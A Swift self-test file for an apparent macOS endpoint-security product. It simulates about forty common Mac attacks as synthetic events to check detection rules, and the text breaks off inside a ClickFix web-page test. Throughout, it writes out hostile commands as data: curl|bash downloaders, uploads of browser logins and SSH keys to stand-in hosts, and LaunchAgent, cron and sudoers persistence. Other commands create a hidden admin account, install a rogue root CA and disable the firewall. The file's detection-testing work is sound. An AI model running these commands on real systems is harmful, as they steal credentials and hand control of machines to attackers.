import Foundation
import RampartShared
import RampartBehaviour
import RampartTelemetry
import RampartWeb
import RampartPosture

// Attack ideation X6 (2026-11-07): COMMON everyday Mac threats, walked through MITRE ATT&CK for macOS.
// Everything is inert: synthetic SecurityEvents only (no process is ever spawned), fixture plists/JSON in a
// scratch folder that point at non-existent com.rampart.test.* paths or /usr/bin/true, URLs on .test domains.
// Events go through `EventHub.shouldMute(_, policy: .standard)` first, so the result is what the real
// daemon pipeline would see (file events from non-LOLBin Apple tools are dropped there).
// Scenarios marked MISS print instead of failing; only today's working detections are asserted (regressions).
// Matrix: docs/security/attacks-X6.md.

/// Pipeline-faithful simulator: EventHub muting (standard) in front of the BehaviourEngine.
final class X6Sim {
    let engine: BehaviourEngine
    var t = Date(timeIntervalSince1970: 1_800_000_000)
    var nextPid: Int32 = 5000
    var procs: [Int32: ProcessInfoLite] = [:]
    var detections: [Detection] = []
    var muted = 0

    /// X6_NOMUTE=1 bypasses EventHub muting, to show which misses come from the pipeline rather than the rules.
    static let noMute = ProcessInfo.processInfo.environment["X6_NOMUTE"] == "1"
    init(signing: @escaping SigningProvider = x6Signing) { engine = BehaviourEngine(signing: signing) }

    func feed(_ e: SecurityEvent) {
        if !Self.noMute && EventHub.shouldMute(e, policy: .standard) { muted += 1; return }
        detections += engine.process(e)
    }

    static func isPlatform(_ path: String) -> Bool {
        path.hasPrefix("/System/") || path.hasPrefix("/usr/bin/") || path.hasPrefix("/bin/") || path.hasPrefix("/usr/sbin/")
            || path.hasPrefix("/sbin/") || path.hasPrefix("/usr/libexec/")
    }

    @discardableResult
    func exec(_ path: String, _ args: [String] = [], parent: Int32, team: String? = nil, pid: Int32? = nil,
              detail: [String: String] = [:]) -> Int32 {
        t += 0.2
        let p = pid ?? { nextPid += 1; return nextPid }()
        let info = ProcessInfoLite(pid: p, ppid: parent, path: path, args: [path] + args, uid: 501, teamID: team,
                                   isPlatformBinary: Self.isPlatform(path))
        procs[p] = info
        var d = detail; d["start"] = String(t.timeIntervalSince1970) + ".\(p)"
        feed(SecurityEvent(date: t, kind: .exec, process: info, path: path, detail: d, source: "eslogger"))
        return p
    }

    func file(_ kind: SecurityEventKind, _ path: String, by pid: Int32?, dest: String? = nil, detail: [String: String] = [:]) {
        t += 0.05
        feed(SecurityEvent(date: t, kind: kind, process: pid.flatMap { procs[$0] }, path: path, destPath: dest, detail: detail, source: "eslogger"))
    }

    func other(_ kind: SecurityEventKind = .other, by pid: Int32?, path: String? = nil, detail: [String: String]) {
        t += 0.2
        feed(SecurityEvent(date: t, kind: kind, process: pid.flatMap { procs[$0] }, path: path, detail: detail, source: "eslogger"))
    }

    var ruleIDs: Set<String> { Set(detections.flatMap { $0.evidence.map { String($0.title.split(separator: " ").first ?? "") } }) }
    var maxConfidence: Int { detections.map(\.confidence).max() ?? 0 }

    func terminal() -> Int32 {
        exec("/sbin/launchd", parent: 0, pid: 1)
        let term = exec("/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal", parent: 1)
        let login = exec("/usr/bin/login", ["-pf", "user"], parent: term)
        return exec("/bin/zsh", ["-zsh"], parent: login)
    }
    /// A ClickFix-style paste session: risky clipboard from Safari, then Terminal.
    func pasteSession() -> Int32 {
        let z = terminal()
        let safari = exec("/Applications/Safari.app/Contents/MacOS/Safari", parent: 1)
        other(by: safari, detail: ["type": "clipboard", "class": "risky", "source_app": "Safari"])
        return z
    }
}

/// Signing oracle: Apple paths Apple, /Applications notarized (except names containing "Cracked" = ad-hoc),
/// temp/Downloads/Shared/volumes/Application Support payloads unsigned, Homebrew ad-hoc.
let x6Signing: SigningProvider = { path in
    if X6Sim.isPlatform(path) { return SigningInfo(status: .apple) }
    if path.contains("Cracked") { return SigningInfo(status: .adHoc) }
    if path.hasPrefix("/Applications/Microsoft") { return SigningInfo(status: .developerID, teamID: "UBF8T346G9", notarized: true) }
    if path.hasPrefix("/Applications/") { return SigningInfo(status: .developerID, teamID: "EQHXZ8M8AV", notarized: true) }
    if path.hasPrefix("/opt/homebrew/") { return SigningInfo(status: .adHoc) }
    if path.hasPrefix("/tmp/") || path.hasPrefix("/private/tmp/") || path.hasPrefix("/Users/Shared/") || path.contains("/Downloads/")
        || path.hasPrefix("/Volumes/") || path.contains("/Library/Application Support/") || path.contains("/rampart-x6-") {
        return SigningInfo(status: .unsigned)
    }
    return nil
}

struct X6Outcome { let id: String; let tactic: String; let name: String; let layer: String; let result: String; let evidence: String }

extension SelfTest {
    static func attackX6Checks() {
        let fm = FileManager.default
        let scratch = (ProcessInfo.processInfo.environment["RAMPART_SCRATCH"] ?? NSTemporaryDirectory()) + "/rampart-x6-\(UUID().uuidString.prefix(8))"
        try? fm.createDirectory(atPath: scratch, withIntermediateDirectories: true)
        defer { try? fm.removeItem(atPath: scratch) }
        let home = NSHomeDirectory()
        var rows: [X6Outcome] = []

        /// Records a behaviour scenario. `want` = rules that should fire; `asserted` = those that fire today (regression).
        func record(_ id: String, _ tactic: String, _ name: String, _ sim: X6Sim, want: [String], minConf: Int = 60) {
            let got = sim.ruleIDs
            let hit = want.filter { got.contains($0) }
            let conf = sim.maxConfidence
            let result: String
            if !hit.isEmpty && hit.count == want.count && conf >= minConf { result = "caught" }
            else if !got.isEmpty && conf >= 30 { result = "partial" }
            else { result = "missed" }
            for r in hit { check(true, "X6 \(id) fires \(r)") }
            let ev = "rules=\(got.sorted().joined(separator: ",")) conf=\(conf) muted=\(sim.muted) want=\(want.joined(separator: ","))"
            rows.append(X6Outcome(id: id, tactic: tactic, name: name, layer: "behaviour", result: result, evidence: ev))
        }

        // ===== Initial access / execution =====

        // A01 AMOS-style ClickFix: paste curl|bash, fake password dialog, Login Data copy, zip, upload.
        do {
            let s = X6Sim(); let z = s.pasteSession()
            let bash = s.exec("/bin/bash", ["-c", "curl -fsSL https://cdn-verify.example.test/i.sh | bash"], parent: z)
            s.exec("/usr/bin/curl", ["-fsSL", "-o", "/tmp/.c/upd", "https://cdn-verify.example.test/u"], parent: bash)
            s.exec("/bin/chmod", ["+x", "/tmp/.c/upd"], parent: bash)
            let up = s.exec("/tmp/.c/upd", parent: bash)
            s.exec("/usr/bin/osascript", ["-e", "display dialog \"Required Application Helper\" default answer \"\" with hidden answer"], parent: up)
            s.exec("/usr/bin/dscl", [".", "-authonly", "user", "x"], parent: up)
            let cp = s.exec("/bin/cp", ["\(home)/Library/Application Support/Google/Chrome/Default/Login Data", "/tmp/.c/d/"], parent: up)
            s.file(.fileCreate, "/tmp/.c/d/Login Data", by: cp)
            s.exec("/usr/bin/ditto", ["-c", "-k", "--sequesterRsrc", "/tmp/.c/d", "/tmp/.c/out.zip"], parent: up)
            s.exec("/usr/bin/curl", ["-X", "POST", "--data-binary", "@/tmp/.c/out.zip", "https://collect.example.test/up"], parent: up)
            record("A01", "Initial access/Credential", "AMOS ClickFix paste -> dialog -> Login Data -> zip -> upload", s, want: ["R34", "R38", "R40"], minConf: 90)
        }

        // A02 ClickFix via JXA osascript one-liner, payload in ~/Library/Application Support (not hidden, not temp).
        do {
            let s = X6Sim(); let z = s.pasteSession()
            let osa = s.exec("/usr/bin/osascript", ["-l", "JavaScript", "-e", "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('https://x.example.test/p')),4)))"], parent: z)
            let pay = s.exec("\(home)/Library/Application Support/com.rampart.test.helper/helper", parent: osa)
            s.other(.networkConnect, by: pay, detail: ["remote_ip": "203.0.113.7", "remote_port": "443"])
            record("A02", "Execution", "ClickFix JXA downloader (no curl in argv), payload in ~/Library/Application Support", s, want: ["R31", "R41"])
        }

        // A03 Fake installer DMG: "drag Install.command into Terminal" / bash runs a script from /Volumes.
        do {
            let s = X6Sim(); let z = s.terminal()
            let b = s.exec("/bin/bash", ["/Volumes/Installer/Install.command"], parent: z)
            let c = s.exec("/usr/bin/curl", ["-so", "/tmp/com.rampart.test.inst", "https://get.example.test/a"], parent: b)
            _ = c
            s.exec("/usr/bin/xattr", ["-c", "/tmp/com.rampart.test.inst"], parent: b)
            s.exec("/bin/chmod", ["+x", "/tmp/com.rampart.test.inst"], parent: b)
            s.exec("/tmp/com.rampart.test.inst", parent: b)
            record("A03", "Initial access/Defense evasion", "Fake DMG: Install.command dragged into Terminal, curl + xattr -c + run", s, want: ["L05", "R29"])
        }

        // A04 Fake Chrome/Flash update app run from a DMG asks for the password.
        do {
            let s = X6Sim(); s.exec("/sbin/launchd", parent: 0, pid: 1)
            let app = s.exec("/Volumes/Chrome Update/Chrome Update.app/Contents/MacOS/Chrome Update", parent: 1)
            s.exec("/usr/bin/osascript", ["-e", "display dialog \"Chrome needs your password to update\" default answer \"\" with hidden answer"], parent: app)
            record("A04", "Initial access", "Fake browser update app from DMG prompts for password", s, want: ["L09", "R34"])
        }

        // A05 Gatekeeper "Open Anyway" (macOS 15+) then shell + fetch from the app.
        do {
            let s = X6Sim(); s.exec("/sbin/launchd", parent: 0, pid: 1)
            s.other(by: nil, detail: ["es_event": "gatekeeper_user_override"])
            let app = s.exec("/Applications/CrackedPhotoshop.app/Contents/MacOS/CrackedPhotoshop", parent: 1)
            let sh = s.exec("/bin/sh", ["-c", "curl -s https://x.example.test/m | sh"], parent: app)
            _ = sh
            record("A05", "Defense evasion", "Gatekeeper override, cracked app spawns curl|sh", s, want: ["R54", "R30"])
        }

        // A06 Office macro (VBA MacScript/AppleScriptTask) spawns sh -> curl | python3.
        do {
            let s = X6Sim(); s.exec("/sbin/launchd", parent: 0, pid: 1)
            let word = s.exec("/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word", parent: 1, team: "UBF8T346G9")
            let sh = s.exec("/bin/sh", ["-c", "curl -s https://docs.example.test/s.py | python3"], parent: word)
            let py = s.exec("/usr/bin/python3", ["-"], parent: sh)
            s.other(.networkConnect, by: py, detail: ["remote_ip": "203.0.113.8", "remote_port": "8443"])
            record("A06", "Initial access/Execution", "Malicious Office macro: Word -> sh -> curl | python3", s, want: ["L08", "R30"])
        }

        // A07 Office sandbox-escape style persistence: Word writes a ~$ LaunchAgent plist.
        do {
            let la = scratch + "/Library/LaunchAgents"
            try? fm.createDirectory(atPath: la, withIntermediateDirectories: true)
            let plist = la + "/~$com.rampart.test.office.plist"
            let d = try! PropertyListSerialization.data(fromPropertyList: ["Label": "com.rampart.test.office",
                       "ProgramArguments": ["/usr/bin/python3", "-c", "import urllib.request;exec(urllib.request.urlopen('https://x.example.test/a').read())"],
                       "RunAtLoad": true], format: .xml, options: 0)
            fm.createFile(atPath: plist, contents: d)
            let s = X6Sim(); s.exec("/sbin/launchd", parent: 0, pid: 1)
            let word = s.exec("/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word", parent: 1, team: "UBF8T346G9")
            s.file(.fileCreate, plist, by: word)
            record("A07", "Persistence", "Office writes ~$ LaunchAgent running python3 -c urlopen/exec", s, want: ["R07"])
        }

        // A08 Python one-liner decoding base64 inside the interpreter (no `base64 -d |`).
        do {
            let s = X6Sim(); let z = s.pasteSession()
            s.exec("/usr/bin/python3", ["-c", "import base64;exec(base64.b64decode('cHJpbnQoJ3JhbXBhcnQtdGVzdCcp'))"], parent: z)
            record("A08", "Execution/Defense evasion", "python3 -c exec(base64.b64decode(...)) pasted", s, want: ["L04"])
        }

        // ===== Supply chain =====

        // A09 npm postinstall stealer: node reads SSH key + AWS creds, posts to a Discord webhook.
        do {
            let s = X6Sim(); let z = s.terminal()
            let npm = s.exec("/opt/homebrew/bin/node", ["/opt/homebrew/bin/npm", "install"], parent: z)
            let sh = s.exec("/bin/sh", ["-c", "node scripts/postinstall.js"], parent: npm)
            let node = s.exec("/opt/homebrew/bin/node", ["scripts/postinstall.js"], parent: sh)
            s.file(.fileClose, "\(home)/.ssh/id_ed25519", by: node, detail: ["modified": "0"])
            s.file(.fileClose, "\(home)/.aws/credentials", by: node, detail: ["modified": "0"])
            s.other(.dnsQuery, by: node, detail: ["name": "discord.com"])
            record("A09", "Supply chain/Credential", "npm postinstall reads ~/.ssh + ~/.aws, posts to Discord", s, want: ["R37", "R42"])
        }

        // A10 PyPI stealer run by Apple's /usr/bin/python3 opens Chrome Login Data directly (no cp in argv).
        do {
            let s = X6Sim(); let z = s.terminal()
            let pip = s.exec("/usr/bin/python3", ["-m", "pip", "install", "requests-colour"], parent: z)
            let py = s.exec("/usr/bin/python3", ["setup.py", "install"], parent: pip)
            s.file(.fileClose, "\(home)/Library/Application Support/Google/Chrome/Default/Login Data", by: py, detail: ["modified": "0"])
            s.file(.fileClose, "\(home)/Library/Application Support/Google/Chrome/Default/Cookies", by: py, detail: ["modified": "0"])
            s.other(.networkConnect, by: py, detail: ["remote_ip": "203.0.113.9", "remote_port": "443"])
            record("A10", "Supply chain/Credential", "pip setup.py (Apple python3) opens Chrome Login Data/Cookies", s, want: ["R37"], minConf: 30)
        }

        // ===== Credential access / collection =====

        // A11 SSH key theft by directory: tar ~/.ssh then curl -T.
        do {
            let s = X6Sim(); let z = s.pasteSession()
            let sh = s.exec("/bin/sh", ["-c", "tar czf /tmp/k.tgz -C ~ .ssh && curl -T /tmp/k.tgz https://up.example.test/"], parent: z)
            s.exec("/usr/bin/tar", ["czf", "/tmp/k.tgz", "-C", home, ".ssh"], parent: sh)
            s.exec("/usr/bin/curl", ["-T", "/tmp/k.tgz", "https://up.example.test/"], parent: sh)
            record("A11", "Credential/Exfil", "tar ~/.ssh directory + curl -T upload", s, want: ["R37", "R43"])
        }

        // A12 SSH keys exfiltrated with scp -r (scp is excluded from R37).
        do {
            let s = X6Sim(); let z = s.pasteSession()
            s.exec("/usr/bin/scp", ["-r", "\(home)/.ssh", "u@drop.example.test:"], parent: z)
            record("A12", "Credential/Exfil", "scp -r ~/.ssh to remote host", s, want: ["R37", "R37S"])
        }

        // A13 Secrets outside the sensitive-path list: shell history, gh/npm/docker tokens, Messages, Safari history.
        do {
            let s = X6Sim(); s.exec("/sbin/launchd", parent: 0, pid: 1)
            let st = s.exec("/Users/Shared/.com.rampart.test.s/s", parent: 1)
            for p in ["/.zsh_history", "/.config/gh/hosts.yml", "/.npmrc", "/.docker/config.json", "/.git-credentials",
                      "/Library/Messages/chat.db", "/Library/Safari/History.db", "/.gnupg/private-keys-v1.d/x.key"] {
                s.file(.fileClose, home + p, by: st, detail: ["modified": "0"])
            }
            record("A13", "Credential/Collection", "Unsigned stealer reads zsh_history, gh/npm/docker/git tokens, Messages, Safari history, GPG", s, want: ["R37"])
        }

        // A14 AMOS file grabber: copies Desktop/Documents .txt/.pdf/.kdbx into a staging dir.
        do {
            let s = X6Sim(); s.exec("/sbin/launchd", parent: 0, pid: 1)
            let st = s.exec("/tmp/.com.rampart.test.g/g", parent: 1)
            for i in 0..<30 { s.file(.fileClose, "\(home)/Desktop/notes\(i).txt", by: st, detail: ["modified": "0"]) }
            s.file(.fileClose, "\(home)/Documents/Passwords.kdbx", by: st, detail: ["modified": "0"])
            for i in 0..<30 { s.file(.fileCreate, "/tmp/.com.rampart.test.g/FileGrabber/notes\(i).txt", by: st) }
            record("A14", "Collection", "File grabber copies 30 Desktop docs + .kdbx into /tmp staging", s, want: ["R29", "R37"])
        }

        // A15 Crypto clipboard hijacker: unsigned agent polls pbpaste and rewrites with pbcopy.
        do {
            let s = X6Sim(); s.exec("/sbin/launchd", parent: 0, pid: 1)
            let ag = s.exec("\(home)/Library/Application Support/com.rampart.test.clip/agent", parent: 1)
            for _ in 0..<10 {
                let sh = s.exec("/bin/sh", ["-c", "pbpaste | sed -E 's/bc1[a-z0-9]{20,}/bc1qrampartTEST/' | pbcopy"], parent: ag)
                s.exec("/usr/bin/pbpaste", parent: sh); s.exec("/usr/bin/pbcopy", parent: sh)
            }
            record("A15", "Collection/Impact", "Clipboard crypto-address swapper (pbpaste|sed|pbcopy loop)", s, want: ["R59"], minConf: 30)
        }

        // A16 Wallet app trojanisation (Odyssey/AMOS): unsigned process rewrites Ledger Live's app.asar.
        do {
            let s = X6Sim(); s.exec("/sbin/launchd", parent: 0, pid: 1)
            let st = s.exec("/tmp/.com.rampart.test.w/w", parent: 1)
            s.file(.fileWrite, "/Applications/Ledger Live.app/Contents/Resources/app.asar", by: st)
            record("A16", "Persistence/Credential", "Unsigned tool replaces Ledger Live app.asar", s, want: ["R60W"])
        }

        // ===== Persistence =====

        // A17 LaunchAgent pointing at hidden payload, written by curl from a paste chain.
        do {
            let la = scratch + "/Library/LaunchAgents"
            try? fm.createDirectory(atPath: la, withIntermediateDirectories: true)
            let plist = la + "/com.rampart.test.update.plist"
            let d = try! PropertyListSerialization.data(fromPropertyList: ["Label": "com.rampart.test.update",
                       "ProgramArguments": [scratch + "/.hidden/com.rampart.test.agent"], "RunAtLoad": true], format: .xml, options: 0)
            fm.createFile(atPath: plist, contents: d)
            let s = X6Sim(); let z = s.pasteSession()
            let sh = s.exec("/bin/sh", ["-c", "curl -so \(plist) https://x.example.test/p"], parent: z)
            let c = s.exec("/usr/bin/curl", ["-so", plist, "https://x.example.test/p"], parent: sh)
            s.file(.fileCreate, plist, by: c)
            s.exec("/bin/launchctl", ["bootstrap", "gui/501", plist], parent: sh)
            record("A17", "Persistence", "LaunchAgent to hidden unsigned payload written by curl in paste chain", s, want: ["R07"])
        }

        // A18 Same LaunchAgent written by PlistBuddy (non-LOLBin Apple tool -> file event muted by EventHub).
        do {
            let la = scratch + "/Library/LaunchAgents"
            let plist = la + "/com.rampart.test.pb.plist"
            let d = try! PropertyListSerialization.data(fromPropertyList: ["Label": "com.rampart.test.pb",
                       "ProgramArguments": [scratch + "/.hidden/com.rampart.test.agent2"], "RunAtLoad": true], format: .xml, options: 0)
            fm.createFile(atPath: plist, contents: d)
            let s = X6Sim(); s.exec("/sbin/launchd", parent: 0, pid: 1)
            let dropper = s.exec("/Users/Shared/com.rampart.test.dropper", parent: 1)
            let pb = s.exec("/usr/libexec/PlistBuddy", ["-c", "Add :Label string com.rampart.test.pb", plist], parent: dropper)
            s.file(.fileCreate, plist, by: pb)
            record("A18", "Persistence", "LaunchAgent created with /usr/libexec/PlistBuddy by unsigned dropper (no launchctl)", s, want: ["R07"])
        }

        // A19 cron persistence via `(crontab -l; echo ...) | crontab -`.
        do {
            let s = X6Sim(); let z = s.pasteSession()
            let sh = s.exec("/bin/sh", ["-c", "(crontab -l; echo '*/5 * * * * curl -s https://x.example.test/c|sh') | crontab -"], parent: z)
            s.exec("/usr/bin/crontab", ["-"], parent: sh)
            record("A19", "Persistence", "cron job added via crontab -", s, want: ["R11"], minConf: 30)
        }

        // A20 `at` job (atrun disabled by default but enable-able).
        do {
            let s = X6Sim(); s.exec("/sbin/launchd", parent: 0, pid: 1)
            let d = s.exec("/tmp/com.rampart.test.at", parent: 1)
            let at = s.exec("/usr/bin/at", ["now", "+", "1", "minute"], parent: d)
            s.file(.fileCreate, "/usr/lib/cron/jobs/a0001201b2c3d4", by: at)
            record("A20", "Persistence", "at job queued (file written by /usr/bin/at, muted)", s, want: ["R11"], minConf: 30)
        }

        // A21 .zshenv gains curl|sh line (needs added_lines from the watcher).
        do {
            let s = X6Sim(); let z = s.pasteSession()
            s.file(.fileWrite, "\(home)/.zshenv", by: z, detail: ["added_lines": "curl -s https://x.example.test/r | sh >/dev/null 2>&1 &"])
            record("A21", "Persistence", "~/.zshenv appended with curl|sh", s, want: ["R12"])
        }

        // A22 sudoers NOPASSWD drop-in via tee.
        do {
            let s = X6Sim(); let z = s.pasteSession()
            let sh = s.exec("/bin/sh", ["-c", "echo 'user ALL=(ALL) NOPASSWD: ALL' | sudo tee /etc/sudoers.d/com-rampart-test"], parent: z)
            let su = s.exec("/usr/bin/sudo", ["tee", "/etc/sudoers.d/com-rampart-test"], parent: sh)
            let tee = s.exec("/usr/bin/tee", ["/etc/sudoers.d/com-rampart-test"], parent: su)
            s.file(.fileCreate, "/private/etc/sudoers.d/com-rampart-test", by: tee)
            record("A22", "Privilege escalation/Persistence", "sudoers.d NOPASSWD drop-in via sudo tee", s, want: ["R16"])
        }

        // A23 PAM tampering: pam_permit.so prepended to /etc/pam.d/sudo (cp, a LOLBin, so not muted).
        do {
            let s = X6Sim(); let z = s.pasteSession()
            let su = s.exec("/usr/bin/sudo", ["cp", "/tmp/com.rampart.test.pam", "/etc/pam.d/sudo"], parent: z)
            let cp = s.exec("/bin/cp", ["/tmp/com.rampart.test.pam", "/etc/pam.d/sudo"], parent: su)
            s.file(.fileWrite, "/private/etc/pam.d/sudo", by: cp)
            s.file(.fileCreate, "/usr/local/lib/pam/pam_com_rampart_test.so", by: cp)
            record("A23", "Credential/Persistence", "PAM: /etc/pam.d/sudo replaced + new module in /usr/local/lib/pam", s, want: ["R16"])
        }

        // A24 Hidden admin account backdoor.
        do {
            let s = X6Sim(); let z = s.pasteSession()
            let sh = s.exec("/bin/sh", ["-c", "sudo sysadminctl -addUser .svc -password x -admin"], parent: z)
            s.exec("/usr/sbin/sysadminctl", ["-addUser", ".svc", "-password", "x", "-admin"], parent: sh)
            s.exec("/usr/bin/dscl", [".", "-create", "/Users/.svc", "IsHidden", "1"], parent: sh)
            s.exec("/usr/sbin/dseditgroup", ["-o", "edit", "-a", ".svc", "-t", "user", "admin"], parent: sh)
            record("A24", "Persistence/Privilege escalation", "Hidden admin user via sysadminctl/dscl IsHidden/dseditgroup", s, want: ["R16b"])
        }

        // A25 SSH authorized_keys appended through `tee -a` (tee is not a LOLBin -> muted).
        do {
            let s = X6Sim(); let z = s.pasteSession()
            let sh = s.exec("/bin/sh", ["-c", "echo ssh-ed25519 AAAA... | tee -a ~/.ssh/authorized_keys"], parent: z)
            let tee = s.exec("/usr/bin/tee", ["-a", "\(home)/.ssh/authorized_keys"], parent: sh)
            s.file(.fileWrite, "\(home)/.ssh/authorized_keys", by: tee)
            record("A25", "Persistence", "authorized_keys appended via tee -a", s, want: ["R14"])
        }

        // A26 Login item via System Events from a paste chain.
        do {
            let s = X6Sim(); let z = s.pasteSession()
            s.exec("/usr/bin/osascript", ["-e", "tell application \"System Events\" to make login item at end with properties {path:\"/Users/Shared/com.rampart.test.app\", hidden:true}"], parent: z)
            record("A26", "Persistence", "Login item via osascript System Events (pasted)", s, want: ["L07"], minConf: 30)
        }

        // ===== Browser: extensions, hijack =====

        // A27 Chrome force-install policy via defaults (adware).
        do {
            let s = X6Sim(); s.exec("/sbin/launchd", parent: 0, pid: 1)
            let d = s.exec("/tmp/com.rampart.test.adw", parent: 1)
            s.exec("/usr/bin/defaults", ["write", "com.google.Chrome", "ExtensionInstallForcelist", "-array", "abcdefghijklmnopabcdefghijklmnop;https://x.example.test/u.xml"], parent: d)
            record("A27", "Persistence (adware)", "Chrome ExtensionInstallForcelist via defaults", s, want: ["R20"])
        }

        // A28 Chrome relaunched with --load-extension from a hidden folder (Adload/Shlayer style).
        do {
            let s = X6Sim(); s.exec("/sbin/launchd", parent: 0, pid: 1)
            let d = s.exec("\(home)/Library/Application Support/.com.rampart.test.ext/run", parent: 1)
            s.exec("/usr/bin/pkill", ["-x", "Google Chrome"], parent: d)
            s.exec("/Applications/Google Chrome.app/Contents/MacOS/Google Chrome", ["--load-extension=\(home)/Library/Application Support/.com.rampart.test.ext/x", "--restore-last-session"], parent: d)
            record("A28", "Persistence (adware)", "Chrome relaunched with --load-extension=<hidden dir>", s, want: ["R20L"])
        }

        // A29 Chrome "External Extensions" JSON drop (no policy, no defaults).
        do {
            let s = X6Sim(); s.exec("/sbin/launchd", parent: 0, pid: 1)
            let d = s.exec("/tmp/com.rampart.test.adw2", parent: 1)
            s.file(.fileCreate, "\(home)/Library/Application Support/Google/Chrome/External Extensions/abcdefghijklmnopabcdefghijklmnop.json", by: d)
            record("A29", "Persistence (adware)", "Chrome External Extensions/<id>.json written by unsigned tool", s, want: ["R20"])
        }

        // ===== Network: DNS changer / proxy / hosts / root CA / profile =====

        // A30 DNS changer via networksetup.
        do {
            let s = X6Sim(); s.exec("/sbin/launchd", parent: 0, pid: 1)
            let d = s.exec("/tmp/com.rampart.test.dns", parent: 1)
            s.exec("/usr/sbin/networksetup", ["-setdnsservers", "Wi-Fi", "203.0.113.53"], parent: d)
            record("A30", "Defense evasion/C2", "DNS changer via networksetup -setdnsservers", s, want: ["R25"], minConf: 30)
        }

        // A31 DNS changer via scutil (stdin) / direct SystemConfiguration preferences.plist write.
        do {
            let s = X6Sim(); s.exec("/sbin/launchd", parent: 0, pid: 1)
            let d = s.exec("/tmp/com.rampart.test.dns2", parent: 1)
            s.exec("/usr/sbin/scutil", [], parent: d)
            s.file(.fileWrite, "/Library/Preferences/SystemConfiguration/preferences.plist", by: d)
            record("A31", "Defense evasion/C2", "DNS/proxy via scutil stdin or direct SystemConfiguration/preferences.plist write", s, want: ["R25"], minConf: 30)
        }

        // A32 Proxy hijack (PAC).
        do {
            let s = X6Sim(); s.exec("/sbin/launchd", parent: 0, pid: 1)
            let d = s.exec("/tmp/com.rampart.test.pac", parent: 1)
            s.exec("/usr/sbin/networksetup", ["-setautoproxyurl", "Wi-Fi", "http://pac.example.test/p.pac"], parent: d)
            record("A32", "Collection (AiTM)", "Proxy hijack via networksetup -setautoproxyurl", s, want: ["R25"], minConf: 30)
        }

        // A33 hosts file redirect via `sudo tee -a /etc/hosts` (tee file event muted, no exec matcher).
        do {
            let s = X6Sim(); let z = s.pasteSession()
            let su = s.exec("/usr/bin/sudo", ["tee", "-a", "/etc/hosts"], parent: z)
            let tee = s.exec("/usr/bin/tee", ["-a", "/etc/hosts"], parent: su)
            s.file(.fileWrite, "/private/etc/hosts", by: tee)
            record("A33", "Defense evasion/C2", "/etc/hosts redirect via sudo tee -a", s, want: ["R25"], minConf: 30)
        }

        // A34 Rogue root CA, and the trust-settings-import variant.
        do {
            let s = X6Sim(); let z = s.pasteSession()
            s.exec("/usr/bin/security", ["add-trusted-cert", "-d", "-r", "trustRoot", "-k", "/Library/Keychains/System.keychain", "/tmp/com.rampart.test.ca.pem"], parent: z)
            record("A34", "Defense evasion/Collection", "Root CA via security add-trusted-cert", s, want: ["R24"])
            let s2 = X6Sim(); let z2 = s2.pasteSession()
            s2.exec("/usr/bin/security", ["trust-settings-import", "-d", "/tmp/com.rampart.test.trust.plist"], parent: z2)
            record("A35", "Defense evasion/Collection", "Root CA via security trust-settings-import", s2, want: ["R24"])
        }

        // A36 Malicious configuration profile opened from a paste chain (Terminal lineage).
        do {
            let s = X6Sim(); let z = s.pasteSession()
            let sh = s.exec("/bin/sh", ["-c", "curl -so /tmp/p.mobileconfig https://x.example.test/p && open /tmp/p.mobileconfig"], parent: z)
            s.exec("/usr/bin/open", ["/tmp/p.mobileconfig"], parent: sh)
            record("A36", "Persistence/Defense evasion", "Configuration profile downloaded + opened (before user installs)", s, want: ["R23"])
        }

        // ===== Defense evasion / impact / remote access =====

        // A37 Application firewall disabled.
        do {
            let s = X6Sim(); let z = s.pasteSession()
            s.exec("/usr/libexec/ApplicationFirewall/socketfilterfw", ["--setglobalstate", "off"], parent: z)
            record("A37", "Defense evasion", "Firewall off via socketfilterfw --setglobalstate off", s, want: ["L06"])
        }

        // A38 Log / history wiping.
        do {
            let s = X6Sim(); s.exec("/sbin/launchd", parent: 0, pid: 1)
            let d = s.exec("/tmp/com.rampart.test.wipe", parent: 1)
            s.exec("/usr/bin/log", ["erase", "--all"], parent: d)
            s.exec("/bin/rm", ["-f", "\(home)/.zsh_history", "\(home)/.bash_history"], parent: d)
            s.file(.fileDelete, "\(home)/.zsh_history", by: d)
            record("A38", "Defense evasion", "log erase --all + delete shell history", s, want: ["L11"], minConf: 30)
        }

        // A39 Screen Sharing / ARD enabled via kickstart.
        do {
            let s = X6Sim(); let z = s.pasteSession()
            s.exec("/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart",
                   ["-activate", "-configure", "-access", "-on", "-privs", "-all", "-restart", "-agent"], parent: z)
            record("A39", "Persistence/Lateral movement", "Remote Management enabled via ARD kickstart", s, want: ["R15"], minConf: 30)
        }

        // A40 Kill security tools.
        do {
            let s = X6Sim(); let z = s.pasteSession()
            s.exec("/usr/bin/pkill", ["-9", "rampartd"], parent: z)
            record("A40", "Defense evasion", "pkill -9 rampartd", s, want: ["R55"])
        }

        // A41 Cracked-app cryptominer, inside an ad-hoc signed app bundle in /Applications.
        do {
            let s = X6Sim(); s.exec("/sbin/launchd", parent: 0, pid: 1)
            let app = s.exec("/Applications/CrackedFinalCut.app/Contents/MacOS/CrackedFinalCut", parent: 1)
            let m = s.exec("/Applications/CrackedFinalCut.app/Contents/Resources/com.rampart.test.helper",
                           ["-o", "stratum+tcp://pool.example.test:3333", "-u", "WALLET", "--donate-level", "1", "--background"], parent: app)
            s.other(.networkConnect, by: m, detail: ["remote_ip": "203.0.113.33", "remote_port": "3333"])
            record("A41", "Impact (resource hijacking)", "Cracked app launches XMRig-style miner (stratum+tcp, port 3333)", s, want: ["R41"])
        }

        // A42 Miner in a hidden Application Support folder relaunched by a LaunchAgent.
        do {
            let s = X6Sim(); s.exec("/sbin/launchd", parent: 0, pid: 1)
            let m = s.exec("\(home)/Library/Application Support/.com.rampart.test.mdworker/mdworker_shared", ["-o", "pool.example.test:443", "--tls", "-u", "WALLET"], parent: 1)
            s.other(.networkConnect, by: m, detail: ["remote_ip": "203.0.113.34", "remote_port": "443"])
            record("A42", "Impact (resource hijacking)", "Hidden miner masquerading as mdworker_shared", s, want: ["R29", "R41"])
        }

        // ===== Non-behaviour layers =====

        // W01 ClickFix page (web layer).
        let checker = ScamChecker()
        do {
            let html = "<html><title>Verify you are human</title><body><p>To continue, complete these steps: press Command + Space, type Terminal, then press Command + V and Return.</p><script>document.addEventListener('click',()=>navigator.clipboard.writeText('curl -s https://x.example.test/a | bash'))</script></body></html>"
